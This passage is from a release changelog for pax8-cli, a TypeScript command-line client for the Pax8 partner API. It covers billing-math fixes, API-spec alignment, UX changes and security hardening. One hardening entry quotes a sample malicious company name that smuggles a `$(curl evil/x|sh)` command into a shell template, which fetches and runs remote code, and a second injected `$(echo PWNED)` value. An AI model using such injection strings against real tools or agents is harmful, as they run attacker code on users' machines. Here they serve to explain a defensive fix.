[#396](https://github.com/pax8labs/pax8-cli/issues/396). No behavior change.

- [#441](https://github.com/pax8labs/pax8-cli/pull/441) [`bcd6fec`](https://github.com/pax8labs/pax8-cli/commit/bcd6fecc81ff470124382bae3bddd82afb27cb32) Thanks [@jidulberger](https://github.com/jidulberger)! - Reconcile OSS license references for consistency before publish ([#434](https://github.com/pax8labs/pax8-cli/issues/434)).

  Fixed the one drift case where the human-readable README used "Apache 2.0" (space) while every machine-readable surface — every `package.json`'s `license` field, every SPDX header in source — uses the canonical SPDX identifier `Apache-2.0` (hyphenated). The change is one character (space → hyphen) in `README.md`, but the rationale is partner clarity: a single canonical form across every surface a partner, contributor, or automated license scanner reads.

  Adds `packages/cli/src/__tests__/license-consistency.test.ts` as a regression guard, mirroring the forbidden-fields walker pattern from [#315](https://github.com/pax8labs/pax8-cli/issues/315). Future PRs cannot reintroduce the non-canonical "Apache <digit>" form in any tracked file outside the verbatim `LICENSE` template and historical CHANGELOG entries.

  Walked the full 12-surface audit from [#434](https://github.com/pax8labs/pax8-cli/issues/434) (NOTICE, GitHub About, `pax8 --version`, `pax8 doctor`, `packages/core/README.md`, `docs/`, telemetry payloads, `.changeset/*`, generated CHANGELOG, README header badges, CI workflows, dependency licenses). Findings are in the PR description.

  Dependency-license review: no GPL/AGPL/SSPL or other Apache-2.0-incompatible licenses across the dependency tree. The single `Unknown` entry (`spawndamnit`, a transitive dev-only changesets dep) ships an MIT LICENSE file; `pnpm` just can't parse its `"SEE LICENSE IN LICENSE"` field. `MPL-2.0` and `Python-2.0` entries are dev-only and compatible.

  The separate coordination item — LICENSE legal sign-off (owner Courtney Norton, tracked in `docs/triage/launch-coordination.md`) — is not replaced by this change. Both must clear before publish.

- [#502](https://github.com/pax8labs/pax8-cli/pull/502) [`93a7405`](https://github.com/pax8labs/pax8-cli/commit/93a7405e34556d62ef89dcfe1c2b13c693d5de95) Thanks [@jidulberger](https://github.com/jidulberger)! - Two interlocking money-correctness fixes that both inflated and mislabeled partner-cost numbers across dashboard, recommendations, cost-sim, and reports.

  **Breaking-feeling change for some users:** monthly-cost aggregates will drop for any partner whose portfolio includes `One-Time`, `Trial`, or `Activation` line items. The pre-fix code returned `price × quantity` (gross) for these terms, which inflated every "monthly Pax8 cost" and "potential uplift" figure that aggregates `subscriptionMrr()`. These terms are not recurring revenue and now correctly contribute **0** to monthly aggregates. The drop is the _correct_ number — but it is a visible delta day-over-day, so partners reviewing dashboards after upgrade should expect their headline number to reset.

  Specifics:
  1. **`subscriptionMrr()` per-term divisor table.** Replaced the previous switch with a `Record<BillingTerm | "1-Year", number>` divisor table. `Monthly`, `Annual` (and the defensive `"1-Year"` alias used by `commitment.term`), `2-Year`, `3-Year` divide normally; `One-Time`, `Trial`, `Activation` contribute 0. Unknown enum values now contribute 0 and emit a one-shot stderr warning per process per unknown value — a future Pax8 enum addition surfaces instead of silently miscounting.
  2. **`formatCurrency()` honors `currencyCode`.** The previous implementation hard-coded `"$"`, so every EUR / GBP / CAD partner saw their subscriptions, dashboard, top customers, recommendations, and cost-sim output mislabeled as USD. The `subscriptions list` table had a workaround that appended `" EUR"` per row; that suffix is dropped here and the formatter is the single source of truth via `Intl.NumberFormat`. Falls back to a numeric + code-suffix render when ICU rejects a code. `cost sim` now threads the matched current subscription's currency through to output.

  New demo fixtures (`demo-data.ts`) provide regression gates: Coastline's One-Time EUR onboarding fee (zero-MRR + non-USD), Bright Minds' Trial Defender seat (zero-MRR), Acme's GBP Entra ID P2 (non-USD rendering).

  Closes [#465](https://github.com/pax8labs/pax8-cli/issues/465), [#472](https://github.com/pax8labs/pax8-cli/issues/472).

- [#374](https://github.com/pax8labs/pax8-cli/pull/374) [`5be6279`](https://github.com/pax8labs/pax8-cli/commit/5be627907abe2f900900cbd47fafd4fd7e6c94a0) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 orders list` no longer renders an `Status` column in the default table output. Wire-level testing against the real Pax8 API on 2026-05-11 confirmed (a) the `Order` schema has no `status` field on `GET /orders` or `GET /orders/{id}`, and (b) the server silently ignores `?status=` (every value, including bogus ones like `NotAStatus`, returns the full unfiltered set). The column previously rendered a gray em-dash for every row against real prod data; the `--status` flag is retained as a documented no-op for backwards compatibility with partner scripts. Help text and the inline source comment now reflect the verified behavior, and `docs/triage/orders-status-server-behavior.md` captures the methodology. Tracking eventual API-side resolution in [#369](https://github.com/pax8labs/pax8-cli/issues/369).

- [#373](https://github.com/pax8labs/pax8-cli/pull/373) [`1a082a8`](https://github.com/pax8labs/pax8-cli/commit/1a082a891d63eaa79c085cac296137c31a86a91e) Thanks [@jidulberger](https://github.com/jidulberger)! - `PAX8_DEMO=false` / `PAX8_DEMO=0` now correctly overrides `demo: true` in `~/.pax8/config.yaml`, letting users keep demo as a safe default while opting into the real API per-invocation. Previously the env var could only force demo ON; force-OFF required editing config.

  Centralizes the precedence logic into a single `resolveDemoMode(config)` / `resolveDemoModeAsync()` helper in `lib/context.ts` and updates the four sites that previously had inline copies with subtly different behavior:
  - `buildContext()` — what command code sees as `ctx.isDemo`
  - `pax8 doctor` — auth check + diagnostic body
  - The top-level `✨ Demo mode — showing sample data` banner
  - The telemetry `isDemo` event tag

  Truthy env values (`1`, `true`) and falsy values (`0`, `false`) take precedence over config in either direction; an unset env var defers to `config.demo`.

- [#425](https://github.com/pax8labs/pax8-cli/pull/425) [`436952d`](https://github.com/pax8labs/pax8-cli/commit/436952d5149c4f22d0e9a39d0a37eaa2ebadff61) Thanks [@jidulberger](https://github.com/jidulberger)! - UX: `pax8 recommendations act --help` now discloses the CLI-local heuristic nature of the recommendations it operates on. Previously the disclosure existed on `pax8 recommendations list` (STAX divergence, "seat_gap" heuristic framing, provisional engine status, ARC-785/[#375](https://github.com/pax8labs/pax8-cli/issues/375) sunset) but not on `act` — partners running only `act --help` weren't shown that bulk action places real orders against CLI-side heuristics, not Pax8's canonical Opportunity Explorer. Mirrors the existing disclosure pattern; no flag or behavior changes.

- [#498](https://github.com/pax8labs/pax8-cli/pull/498) [`32cb6c8`](https://github.com/pax8labs/pax8-cli/commit/32cb6c82f920358660a027d52151a5a0656f9339) Thanks [@jidulberger](https://github.com/jidulberger)! - Two hardening fixes against adversarial input from the partner-tenant API surface:
  1. **`Recommendation.orderArgs` (new, `@pax8/core` minor bump).** `Recommendation.orderCommand` was a display string built by interpolating the upstream-controlled `companyName` into a shell template. A malicious customer name like `Acme" $(curl evil/x|sh) "` produced a working shell payload once a user or tool-using agent pasted it into `bash -c` or `eval`. New `orderArgs: string[] | null` field is the same content pre-tokenized as an argv-style array (first element is `"pax8"`); programmatic callers — REPL, `recommendations act`, the Claude skill — execute via this instead of evaluating the display string. `orderCommand` remains for display-only use and now prefers `companyId` when it's a UUID.
  2. **Bug-report redactor catches upstream-resolved names.** When an error like `Company not found: "Acme Corp"` was sent to `pax8 report-bug`, `"Acme Corp"` was not in argv, so the existing argv-derived redaction missed it and the partner name shipped to the public GitHub issue body. `redactEnvelope` now harvests quoted substrings from `message` / `causes[]` / `recoverySteps[]` and treats them as additional `argTokens`. The regex spans from the first quote to the last quote on a line, so a hostile partner name with inner quotes (`Acme" $(echo PWNED) "`) gets scrubbed atomically.

  Closes [#473](https://github.com/pax8labs/pax8-cli/issues/473). Addresses [#462](https://github.com/pax8labs/pax8-cli/issues/462).

- [#499](https://github.com/pax8labs/pax8-cli/pull/499) [`99ff0a2`](https://github.com/pax8labs/pax8-cli/commit/99ff0a2a78b63998ca05c8fded9b41b885bdb0d3) Thanks [@jidulberger](https://github.com/jidulberger)! - Four interlocking fixes to local-state files written by the CLI:
  1. **`PAX8_CONFIG_DIR` routing.** `idempotency.ts`, `dispute.ts`, the REPL pending-actions reader/writer in `repl.ts`, the writers in `companies/list.ts` and `recommendations/list.ts`, and the `init` command's error recovery text all hardcoded `path.join(homedir(), ".pax8")` (or read it via a dynamic `await import("os")` to dodge top-level greps). They now go through `getConfigDir()`, which honors `PAX8_CONFIG_DIR` and stays in sync between readers and writers. The `init` recovery hint renders the resolved path and tells the user how to point at a different root.
  2. **Safe-write `0o600` + `O_NOFOLLOW`.** `last-list.ts`, the REPL `pending-actions.json` writes, the tmp-file step in `dispute.ts` and `idempotency.ts`, and `mock-client.ts`'s `demo-orders.json` writes all wrote via `fs.writeFile` / `writeFileSync`. Under the default umask this left partner-tenant business data world-readable on shared hosts and would follow an attacker-placed symlink at the destination. They now go through `safeWriteFileSync`.
  3. **Repo-wide policy gate (`local-state-writers.test.ts`).** A vitest regression test enforces both rules across `packages/cli/src/` — no direct `os.homedir()`, no raw `writeFileSync` / `fs.writeFile` outside an explicit allow-list. Future state-file additions can't slip past.
  4. **Test hermeticity.** `loader-extended.test.ts` previously created `~/.pax8` on the contributor's real home while exercising the default-path code path; it now stubs `os.homedir()` to a tmpdir per test. New `vitest.real-home-guard-setup.ts` snapshots `~/.pax8` before tests run and asserts the post-suite filesystem is unchanged — any test that mutates the real home now fails CI explicitly. This guard caught a pre-existing bug in `MockPax8Client.OrdersResource` (writes to `~/.pax8/demo-orders.json` ignored `PAX8_CONFIG_DIR`), fixed in this PR.

  **Behavioral note:** demo-mode `demo-orders.json` now lives at `${PAX8_CONFIG_DIR}/demo-orders.json` instead of `~/.pax8/demo-orders.json`. Existing users with persisted demo state under `~/.pax8` will appear to have a fresh demo on first run after upgrade.

  Follow-up tracked in [#504](https://github.com/pax8labs/pax8-cli/issues/504): `credential-store.ts` has the same architectural defect; its unit tests mock `fs.*` so the home-guard doesn't see the leak, but the fix belongs alongside this batch.

  Closes [#458](https://github.com/pax8labs/pax8-cli/issues/458), [#469](https://github.com/pax8labs/pax8-cli/issues/469), [#475](https://github.com/pax8labs/pax8-cli/issues/475), [#459](https://github.com/pax8labs/pax8-cli/issues/459).

- [#505](https://github.com/pax8labs/pax8-cli/pull/505) [`ac07bb6`](https://github.com/pax8labs/pax8-cli/commit/ac07bb68f4e315c0d773119aee54be538b0b0c61) Thanks [@jidulberger](https://github.com/jidulberger)! - Normalize "Try next" pickable-step labels across the CLI:
  - `pax8 subscriptions renewals` previously rendered bare `subscriptions show <id>` and `clients more "<name>"` labels — no `pax8` prefix, no `replCmd()` wrap. Now matches every other command's pattern.
  - `pax8 quotes show` and `pax8 quotes send` drilled into the client by UUID; they now prefer the human-readable `quote.clientName` (flattened from the v2 quoting API's `client.name`) with the UUID as a fallback for shadow companies or older payloads. Matches the established `orders/show.ts` / `contacts/list.ts` pattern.

  Cosmetic / label-only. Action arrays are unchanged, so REPL behavior is identical.

  Closes [#481](https://github.com/pax8labs/pax8-cli/issues/481), [#482](https://github.com/pax8labs/pax8-cli/issues/482).

- [#416](https://github.com/pax8labs/pax8-cli/pull/416) [`1e7e83e`](https://github.com/pax8labs/pax8-cli/commit/1e7e83e328d1f3ca6953f9286b119f297899a013) Thanks [@jidulberger](https://github.com/jidulberger)! - UX: `pax8 dashboard` Quick Actions and `pax8 subscriptions renewals` "Try next:" now render the numbered list before the drill-in prompt. Previously the dashboard printed "Quick Actions" then prompted "Type 1-5" with no visible 1-5 menu (the rows had been built internally but never rendered). The renewals "Try next:" block was static text with no interactive affordance. Both now share the same numbered + pickable pattern via `promptNextSteps({ renderList: true })`. Callers that already print a numbered table above the prompt (`recommendations list`, `companies list`, etc.) keep their existing headless behavior — the `renderList` flag is opt-in. The `subscriptions update <id> --quantity <n>` advisory in renewals remains as informational text below the pickable list since its placeholder argument can't be drilled into interactively.

- [#417](https://github.com/pax8labs/pax8-cli/pull/417) [`ed4dc2b`](https://github.com/pax8labs/pax8-cli/commit/ed4dc2b3c21c1a19e7ae18eb21a6af2c34733720) Thanks [@jidulberger](https://github.com/jidulberger)! - UX: cleaned up ~15 stale `pax8 companies *` references inside command source code that [#382](https://github.com/pax8labs/pax8-cli/issues/382)'s doc cleanup didn't reach. These strings print at runtime as Try-next suggestions, error-recovery hints, and demo-mode `Try:` prompts (in `init`, `contacts/{list,show,update,delete}`, `dashboard`, `subscriptions/show`, `invoices/show`, `orders/create`, `report/mrr`, `quotes` examples, and `companies/{create,list,more,show,update}` Examples blocks). Plus a few user-facing prose strings: "Pick a company first" → "Pick a client first", "Full company summary" → "Full client summary", "view company" → "view client", "Create a new company" → "Create a new client", "List companies:" → "List clients:". The `--company` flag on every command stays unchanged (per [#317](https://github.com/pax8labs/pax8-cli/issues/317)'s decision: flag mirrors the API field; will migrate when the API ships `/clients` endpoints). JSON output field names (`companyId`, `companyName`, etc.) unchanged. Code comments and `companies/index.ts`'s deliberate alias-explanation block also unchanged. Closes the runtime gap that pair-completes [#379](https://github.com/pax8labs/pax8-cli/issues/379)/[#382](https://github.com/pax8labs/pax8-cli/issues/382).

- Updated dependencies [[`830774a`](https://github.com/pax8labs/pax8-cli/commit/830774a8845058541f6cc01afc16dc147694cdbe), [`3796bf9`](https://github.com/pax8labs/pax8-cli/commit/3796bf9f1028bef64bf6cc6fcb24042466644740), [`2788c73`](https://github.com/pax8labs/pax8-cli/commit/2788c73c6fcd83aba6f1d9aa32fb25e2e374f963), [`788c83a`](https://github.com/pax8labs/pax8-cli/commit/788c83a01906095882bc53110ee8df285eb9da20), [`bcd6fec`](https://github.com/pax8labs/pax8-cli/commit/bcd6fecc81ff470124382bae3bddd82afb27cb32), [`d20b113`](https://github.com/pax8labs/pax8-cli/commit/d20b1137ec74e81c9745f5f8f76484086a2f44e8), [`93a7405`](https://github.com/pax8labs/pax8-cli/commit/93a7405e34556d62ef89dcfe1c2b13c693d5de95), [`45fe0d1`](https://github.com/pax8labs/pax8-cli/commit/45fe0d1db00d678c73b709a6137f2e64d69038f6), [`5617161`](https://github.com/pax8labs/pax8-cli/commit/561716145e254eaf91d75c00c8b6e371c8856c22), [`75591cb`](https://github.com/pax8labs/pax8-cli/commit/75591cb57b4b8cda6ada2cddde179c53890719e6), [`d71a0f2`](https://github.com/pax8labs/pax8-cli/commit/d71a0f2e600332167587a2fffbf4198a32fa9e8b), [`d88ce13`](https://github.com/pax8labs/pax8-cli/commit/d88ce13c6a0b2166f70c3d87b2320376286d0c06), [`32cb6c8`](https://github.com/pax8labs/pax8-cli/commit/32cb6c82f920358660a027d52151a5a0656f9339), [`99ff0a2`](https://github.com/pax8labs/pax8-cli/commit/99ff0a2a78b63998ca05c8fded9b41b885bdb0d3), [`224f16a`](https://github.com/pax8labs/pax8-cli/commit/224f16a6030b8d89bfe67d1ba989b49d0fae8130), [`8590150`](https://github.com/pax8labs/pax8-cli/commit/8590150a98e9779e1b17d9fc4dd0f0c9b587b1f2)]:
  - @pax8/core@0.2.0

### Minor Changes

- [#353](https://github.com/pax8labs/pax8-cli/pull/353) [`5faf8a3`](https://github.com/pax8labs/pax8-cli/commit/5faf8a3b91688651afd1a12097c89e28ce65a20a) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 contacts {create,update}`: align request bodies with the public OpenAPI contract.
  - `types` is now `Array<{type, primary}>` per the spec's `ContactType` object schema (was `string[]` of kind enums). The `--type` CLI flag still accepts comma-separated kind names (`Admin,Billing,Technical`); each entry is inflated to `{type, primary: false}` at handler time.
  - `--phone` is now required on `contacts create` — the spec marks it required, and a spec-strict server 422s without it.
  - `contacts update` now fetch-then-merges the current contact before sending so the spec's PUT body invariants (`firstName`, `lastName`, `email`, `phone` all required) are satisfied even when the user passes a single field.
  - `companyId` is no longer carried in the request body — the spec puts it in the URL path (`/v1/companies/{companyId}/contacts[/{contactId}]`) only.

  A new `ContactTypeKind` type (the bare `"Admin"|"Billing"|"Technical"` enum) is exported from `@pax8/core` alongside the reshaped `ContactType` object type, so embedded consumers can keep validating kind names independently of the wire shape.

  Closes [#325](https://github.com/pax8labs/pax8-cli/issues/325).

- [#336](https://github.com/pax8labs/pax8-cli/pull/336) [`569257b`](https://github.com/pax8labs/pax8-cli/commit/569257b928ee6acea3a68fe0621472cda768fad5) Thanks [@jidulberger](https://github.com/jidulberger)! - Feature: `pax8 subscriptions update --billing-term` now mirrors the Pax8 API request-body enum at `PUT /subscriptions/{subscriptionId}`. Accepted values: `Monthly | Annual | 2-Year | 3-Year | One-Time | Trial | Activation`. Previously the CLI's help text advertised only `Monthly or Annual` — a hand-curated subset that didn't reflect the actual API surface; values outside that subset already worked but were undocumented.

  The CLI now also fail-fasts on values outside the API enum (typos, case-mismatched `annual`, etc.) with a clean `ERROR_INVALID_INPUT` listing the canonical accepted set — giving users a CLI-side error instead of an opaque API rejection.

  The existing commitment pre-flight check from [#293](https://github.com/pax8labs/pax8-cli/issues/293) is unchanged: mid-commitment billing-term changes still block at the CLI layer with the actionable recovery message. Vendor-specific acceptance (e.g., a particular vendor not honoring `2-Year`) is deliberately left to the API to surface — the CLI mirrors what's available; the API surfaces what's rejected.

  Source-of-truth for the enum: `docs/triage/billing-term-update-enum.md` (verified against `https://devx.pax8.com/openapi/partner-endpoints.json` on 2026-05-11).

### Patch Changes

- [#352](https://github.com/pax8labs/pax8-cli/pull/352) [`a6cea7f`](https://github.com/pax8labs/pax8-cli/commit/a6cea7fea15bbe63efa9aaf2223737057c44f6d9) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 companies create` and `pax8 companies show` (and every other read that surfaces `address`) now align with the public Pax8 spec:
  - **`AddressSchema` rename (closes [#327](https://github.com/pax8labs/pax8-cli/issues/327), [#328](https://github.com/pax8labs/pax8-cli/issues/328)):** wire field names are now `stateOrProvince` and `postalCode` (previously `state` and `zip`). The CLI flag names `--state` and `--zip` are unchanged for UX continuity — flag vocabulary and wire vocabulary are intentionally separate. Pre-rename, the wrong leaf names silently (a) dropped state/postal data on `companies create` (the API didn't recognize them) and (b) dropped state/postal data on every read (Zod stripped the API's `stateOrProvince` / `postalCode` as unknowns).
  - **Three required billing booleans (closes [#329](https://github.com/pax8labs/pax8-cli/issues/329)):** `companies create` now sends `billOnBehalfOfEnabled`, `selfServiceAllowed`, and `orderApprovalRequired` via new `--bill-on-behalf-of`, `--self-service-allowed`, `--order-approval-required` flags (all default to `false`, matching the conservative shape in the OpenAPI `company-post` example). `CreateCompanyInputSchema` now requires the three booleans at the type level.
  - **Fail-fast on empty address (closes [#329](https://github.com/pax8labs/pax8-cli/issues/329)):** the handler no longer constructs a degenerate empty `address` object on the wire when partners omit address flags. It throws `ERROR_INVALID_INPUT` with a structured error pointing at the spec's `address` requirement.
  - **New `--street` flag** on `companies create` for the spec's `address.street`.

  Demo fixtures and the mock client are renamed to match. Read-side rendering in `companies show` now reads from `address.stateOrProvince` and `address.postalCode`.

- [#350](https://github.com/pax8labs/pax8-cli/pull/350) [`8108ea0`](https://github.com/pax8labs/pax8-cli/commit/8108ea096d2ea82d24fc4cbb8f374952976fe9be) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 contacts` commands now target the documented nested API paths under `/v1/companies/{companyId}/contacts/*`. Previously `ContactsApi.{get,create,update,delete}` called flat `/v1/contacts/*` endpoints that do not exist in the Pax8 public spec; the public OpenAPI definition only addresses contacts via `/v1/companies/{companyId}/contacts[/{contactId}]`.

  **Breaking change at the CLI surface** for `contacts show`, `contacts update`, and `contacts delete`: each now requires `--company <id|name>` because the spec has no flat per-contact lookup. The CLI emits a clear migration error when `--company` is missing. `contacts list` and `contacts create` already required `--company`, so their surface is unchanged. Body-shape bugs surfaced in the same audit ([#325](https://github.com/pax8labs/pax8-cli/issues/325)) are intentionally out of scope for this PR.

  Closes [#324](https://github.com/pax8labs/pax8-cli/issues/324).

- [#362](https://github.com/pax8labs/pax8-cli/pull/362) [`1eecf48`](https://github.com/pax8labs/pax8-cli/commit/1eecf4848241fa3a78f16bdd6968d86cbb7b6339) Thanks [@jidulberger](https://github.com/jidulberger)! - List commands now render a helpful empty-state message when a filter matches zero rows, instead of an empty header-and-divider table that read as "broken." Affects `companies list`, `subscriptions list`, `invoices list`, `invoices items`, `orders list`, `products list`, `contacts list`, `quotes list`, `quotes line-items list`, `usage list`, `webhooks list`, `webhooks topics list`, and `webhooks logs`.

  The new `emptyState` parameter on `output()` (`headline` + optional `reasons` + optional `suggestions`) renders on stderr when `format === "table"` and the data array is empty, preserving the stdout-is-data / stderr-is-everything-else split. `--json` still emits `[]`, `--csv` still emits the header row, `--ids-only` still emits nothing — every agent and pipeline contract is unchanged. Closes [#197](https://github.com/pax8labs/pax8-cli/issues/197).

- [#341](https://github.com/pax8labs/pax8-cli/pull/341) [`87dd835`](https://github.com/pax8labs/pax8-cli/commit/87dd8350cf2ec89232bd527d6284421cc05dcaf1) Thanks [@jidulberger](https://github.com/jidulberger)! - Add wire-level integration test harness ([#308](https://github.com/pax8labs/pax8-cli/issues/308)) that hits the real Pax8 API and asserts every CLI call resolves to the URL documented by the relevant OpenAPI spec. Runs via `pnpm test:integration` and skips cleanly when `PAX8_CLIENT_ID` / `PAX8_CLIENT_SECRET` are absent — the default `pnpm test` never depends on credentials. Seed coverage hits one v1 resource (`companies list`) and one v2 resource (`quotes list`), proving both routing surfaces work against the real API.

  This closes the structural test gap that allowed the [#307](https://github.com/pax8labs/pax8-cli/issues/307) quotes `v1`/`v2` regression to ship: unit tests mocked the client and only asserted relative paths; subprocess tests ran in demo mode against `MockPax8Client`. The new harness is the missing wire-level layer, with a documented extension pattern (`e2e/integration/harness.ts`, `CONTRIBUTING.md`) so any new API surface plugs in with one read-only smoke test. The harness unblocks the held quotes-v2 body-shape fixes ([#311](https://github.com/pax8labs/pax8-cli/issues/311)–[#314](https://github.com/pax8labs/pax8-cli/issues/314) and the parallel audit's [#323](https://github.com/pax8labs/pax8-cli/issues/323)/[#325](https://github.com/pax8labs/pax8-cli/issues/325)/[#326](https://github.com/pax8labs/pax8-cli/issues/326)/[#327](https://github.com/pax8labs/pax8-cli/issues/327)/[#328](https://github.com/pax8labs/pax8-cli/issues/328)/[#329](https://github.com/pax8labs/pax8-cli/issues/329)/[#331](https://github.com/pax8labs/pax8-cli/issues/331)/[#332](https://github.com/pax8labs/pax8-cli/issues/332)).

  `@pax8/core` change: `Pax8Client` debug mode now also emits the resolved absolute URL alongside the existing relative-path log line, e.g. `[pax8] GET url=https://api.pax8.com/v2/quotes?page=0&size=50`. This is what the integration harness parses to verify version routing. Query strings carry no bearer tokens.

- [#360](https://github.com/pax8labs/pax8-cli/pull/360) [`eea4409`](https://github.com/pax8labs/pax8-cli/commit/eea44096c951d0fd80c810a54c0fa40cf0a2c897) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: align `--status` help text on every `list` command with the public Pax8 OpenAPI. `pax8 orders list --status` used to advertise `Completed, Processing, Failed, PendingManual` as if they were a documented enum, but the spec's `Order` schema has no `status` field and `GET /orders` declares no `status` query parameter. The flag is kept (partner scripts that rely on it still work), but the help text now disclaims the spec gap and points to `docs/triage/api-version-audit/orders-status-enum.md`. `pax8 subscriptions list --status` and `pax8 invoices list --status` had similar but smaller defects (subsets of the spec enum with an "...etc." escape hatch); their help text now mirrors the full documented enum. `pax8 companies list --status` and `pax8 quotes list --status` were already correct; both have regression-guard tests added. Closes [#250](https://github.com/pax8labs/pax8-cli/issues/250).

  Wire behavior is unchanged on every command. Only `--help` strings and tests.

- [#348](https://github.com/pax8labs/pax8-cli/pull/348) [`d3d8316`](https://github.com/pax8labs/pax8-cli/commit/d3d8316998343e11d3c0057bb44add7cbeff55e7) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 orders create` and `pax8 recommendations act` now populate the spec-required `lineItemNumber` field on every outgoing line item. The public Pax8 OpenAPI's `CreateLineItem` schema declares `lineItemNumber` as required (it's a 1-based reference used by `parentLineItemNumber` to express child line items within the same order), but the CLI was omitting it entirely — every `POST /orders` payload was violating the published contract.

  The fix lives in `@pax8/core`'s `OrdersApi.create()`: it auto-injects `lineItemNumber = idx + 1` on any line item that doesn't supply one, so existing embedded consumers don't have to think about the field. `OrderLineItemInputSchema` (the wire shape) now requires `lineItemNumber`; a new `OrderLineItemCreateInput` type exposes it as optional for callers, with the auto-fill happening at the boundary. Closes [#331](https://github.com/pax8labs/pax8-cli/issues/331).

  Spec ambiguity: the spec's canonical example (`microsoft-office-365-e3-order`) omits `lineItemNumber` even though the schema marks it required. Matching the schema is safer than matching the example — if the real API tolerates omission today, this fix is still correct (and defensive against future enforcement); if it doesn't, this unblocks single- and multi-line orders.

- [#365](https://github.com/pax8labs/pax8-cli/pull/365) [`828444e`](https://github.com/pax8labs/pax8-cli/commit/828444e5669e1f05a674fafec8ea72428ff3f9a1) Thanks [@jidulberger](https://github.com/jidulberger)! - Surface an actionable hint when `pax8 orders list` (or any command) hits the 30s default HTTP timeout, and make the timeout configurable via `PAX8_TIMEOUT_MS` ([#199](https://github.com/pax8labs/pax8-cli/issues/199)).

  Before: the AbortController-driven timeout threw an `ApiError(status=0, "Request timed out after 30000ms")` that classified as `ERROR_INTERNAL` and rendered as a bare millisecond count. Partners with large portfolios who hit slow `/orders` responses had no signal as to what to try next.

  After:
  - `ERROR_API_TIMEOUT` now covers both server-side 408s and client-side AbortController timeouts. The CLI's `--json` error envelope always carries the code; the human-facing render carries recovery steps.
  - The generic recovery hint suggests retrying, extending the per-request timeout via `PAX8_TIMEOUT_MS=<ms>` (capped at 300000), and running `pax8 doctor`.
  - `pax8 orders list` adds a command-specific layer on top: try a smaller `--size`, narrow with `--company <name>`. The generic env-var escape hatch is concatenated as the floor so it's never crowded out.
  - `PAX8_TIMEOUT_MS` is wired through `getDefaultTimeout()` and applied to every `Pax8Client` request when no explicit `timeout` option is passed. The default (30000ms) and retry behavior are unchanged.
  - New exports from `@pax8/core`: `getDefaultTimeout`, `isApiTimeoutError` — the canonical predicate the CLI's error layer uses to route abort-path timeouts to `ERROR_API_TIMEOUT`. Embedders that want the same hint UX can reuse the predicate.

- [#351](https://github.com/pax8labs/pax8-cli/pull/351) [`629011f`](https://github.com/pax8labs/pax8-cli/commit/629011f861cf8c052e9eaea00bc360e0b58b42e1) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `OrderLineItemInputSchema.provisioningDetails` (and the wire-read `OrderLineItemSchema.provisioningDetails`) reshaped from `Record<string, unknown>` to `Array<{key: string, values: string[]}>` to match the public Pax8 OpenAPI spec's `ProvisioningDetail` schema. No CLI command was populating this field at the time of the fix, so no live traffic was breaking — but the wrong shape was baked into the Zod input contract and would have produced unparseable bodies for any future provisioning-aware feature.

  The new shape is exposed as `OrderLineItemProvisioningDetailSchema` (single entry) and `OrderLineItemProvisioningSchema` (array). The product-side `ProvisioningDetailSchema` (which describes a _product's_ provisioning requirements, not an order line's _values_) is unchanged.

  `pax8 orders create` gains a `provisioning=<key>:<value>[|<value>...]` syntax inside `--line-item`, repeatable for multiple keys: `--line-item product=<id>,quantity=5,provisioning=domain:contoso.com,provisioning=region:us-east|us-west`. The mock client echoes `provisioningDetails` back on dry-run responses so subprocess tests can pin the wire shape. Closes [#332](https://github.com/pax8labs/pax8-cli/issues/332).

- [#339](https://github.com/pax8labs/pax8-cli/pull/339) [`dc7cc93`](https://github.com/pax8labs/pax8-cli/commit/dc7cc93a51ec91d56db1e214789ba796dc32b1af) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes create --expiration-date <date>` is no longer a silent no-op. The flag previously appeared in `quotes create --help` and even rendered "Expires: <date>" in the confirmation prompt, but the value was never sent to the API — `CreateQuoteInputSchema` has no `expiresOn` field, because `POST /v2/quotes` accepts only `{ clientId, quoteRequestId? }` per the v2 quoting OpenAPI spec (see `docs/triage/quotes-api-version.md` §9.1). Setting an expiration on a brand-new quote is a two-step flow on the real API.

  Resolution (Option B from [#306](https://github.com/pax8labs/pax8-cli/issues/306)): the `--expiration-date` option has been removed from `pax8 quotes create`. The help footer now directs users at `pax8 quotes update <id> --expiration-date <YYYY-MM-DD>`, which has always wired the field through correctly via `UpdateQuoteInputSchema.expiresOn`. A regression test in `packages/cli/src/__tests__/quotes.create.test.ts` asserts the flag is absent from the create command's option list, so a future PR cannot silently re-introduce the no-op.

  Scope: standalone fix. The larger v2 rewrite of `quotes create` (companyId → clientId, lineItems-on-create removal, quote-request orchestration) is tracked under [#311](https://github.com/pax8labs/pax8-cli/issues/311) and not pre-empted here.

- [#345](https://github.com/pax8labs/pax8-cli/pull/345) [`e307132`](https://github.com/pax8labs/pax8-cli/commit/e3071321aaf0dd6a4a36bbe76882b8ccd47f28f4) Thanks [@jidulberger](https://github.com/jidulberger)! - Fix: `pax8 quotes create` now sends the v2-spec body shape (`{ clientId, quoteRequestId? }`) instead of the pre-v2 `{ companyId, lineItems[] }`. Per the public quoting OpenAPI spec (v2.0.0), `POST /v2/quotes` accepts only `clientId` (required) plus an optional `quoteRequestId` — line items are added through a separate `POST /v2/quotes/{quoteId}/line-items` call after the quote exists. The previous body would have produced a 4xx body-shape error against the real API ([#311](https://github.com/pax8labs/pax8-cli/issues/311); see `docs/triage/quotes-api-version.md` §9.1).

  Behavior changes:
  - `--product` is now **optional** on `quotes create`. Without it, the command creates an empty draft quote (the natural shape for the v2 surface). This closes the shorthand-vs-canonical decision from [#305](https://github.com/pax8labs/pax8-cli/issues/305) — empty quote is the canonical path, two-call shorthand is a convenience for the common single-line case.
  - When `--product` is supplied, the command orchestrates two wire calls: `POST /v2/quotes` to create the empty quote, then `POST /v2/quotes/{id}/line-items` to append the line. If the line-item POST fails after the create succeeds, the new quote ID is surfaced prominently with a recovery hint (`pax8 quotes line-items add <id> --product X --quantity N`) so the user can retry the add manually instead of losing the quote.
  - `CreateQuoteInputSchema` is renamed: `companyId` → `clientId`. The `lineItems` array is removed from the create input entirely.

